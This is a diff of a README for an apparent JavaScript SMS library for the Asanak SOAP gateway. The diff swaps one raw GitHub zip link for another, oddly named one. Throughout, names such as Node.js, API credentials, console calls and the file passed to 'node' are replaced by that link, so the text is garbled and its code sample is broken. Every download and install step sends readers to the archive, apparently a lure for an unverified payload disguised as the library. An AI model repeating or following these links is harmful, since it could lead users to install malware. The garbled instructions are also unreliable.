@@ -1,18 +1,18 @@
-# 📱 SoapAsanakSMSJS - Send SMS Easily with https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip
+# 📱 SoapAsanakSMSJS - Send SMS Easily with https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip
 
 ## 🛠️ Overview
 
-SoapAsanakSMSJS is a https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip library that lets you send SMS messages through the Asanak SOAP SMS gateway. This library helps you send messages using raw SOAP XML, and it keeps track of both your requests and responses for easy debugging. You can manage your credentials and configuration effortlessly through environment variables.
+SoapAsanakSMSJS is a https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip library that lets you send SMS messages through the Asanak SOAP SMS gateway. This library helps you send messages using raw SOAP XML, and it keeps track of both your requests and responses for easy debugging. You can manage your credentials and configuration effortlessly through environment variables.
 
 ## 📥 Download & Install
 
 To get started with SoapAsanakSMSJS, visit the link below to access the latest releases:
 
-[![Download SoapAsanakSMSJS](https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip%20Now-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip)
+[![Download SoapAsanakSMSJS](https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip%20Now-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip)
 
 You can download the latest version by following these steps:
 
-1. Click on the "Releases" link above or go to the [Releases page](https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip).
+1. Click on the "Releases" link above or go to the [Releases page](https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip).
 2. Locate the version you want to download.
 3. Click on the file suitable for your operating system.
 
@@ -20,14 +20,14 @@ You can download the latest version by following these steps:
 
 ### 🌟 System Requirements
 
-- **https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip**: Version 12 or higher.
-- **NPM**: Comes bundled with https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip
+- **https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip**: Version 12 or higher.
+- **NPM**: Comes bundled with https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip
 - An Internet connection to send SMS messages.
 
 ### 🔧 Installation Steps
 
-1. **Install https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip**:
-   - Visit [https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip official website](https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip) to download and install the correct version for your operating system.
+1. **Install https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip**:
+   - Visit [https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip official website](https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip) to download and install the correct version for your operating system.
    
 2. **Download SoapAsanakSMSJS**:
    - Follow the instructions in the "Download & Install" section to get the latest release.
@@ -49,7 +49,7 @@ You can download the latest version by following these steps:
 After you have installed the library, you can start using it to send SMS messages.
 
 1. **Create a JavaScript File**:
-   - Create a new file named `https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip`.
+   - Create a new file named `https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip`.
    
 2. **Write the Code**:
    - Below is a simple example of how to send an SMS message using the library:
@@ -57,25 +57,25 @@ After you have installed the library, you can start using it to send SMS message
      const SoapAsanakSMSJS = require('./path/to/SoapAsanakSMSJS');
 
      const sms = new SoapAsanakSMSJS({
-       apiKey: https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip,
-       apiSecret: https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip,
-       sender: https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip,
+       apiKey: https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip,
+       apiSecret: https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip,
+       sender: https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip,
      });
 
-     https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip('recipient_number', 'Your message here')
+     https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip('recipient_number', 'Your message here')
        .then(response => {
-         https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip('SMS sent successfully:', response);
+         https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip('SMS sent successfully:', response);
        })
        .catch(error => {
-         https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip('Error sending SMS:', error);
+         https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip('Error sending SMS:', error);
        });
      ```
 
 3. **Run Your Code**:
-   - Open your terminal and navigate to the directory where your `https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip` file is located.
+   - Open your terminal and navigate to the directory where your `https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip` file is located.
    - Execute the command:
      ```
-     node https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/demo/SoapAsanakSMSJS-2.1.zip
+     node https://raw.githubusercontent.com/Robot-B/SoapAsanakSMSJS/main/lib/Soap_SMSJS_Asanak_silkgrower.zip
      ```
 
 4. **Check the Output**:
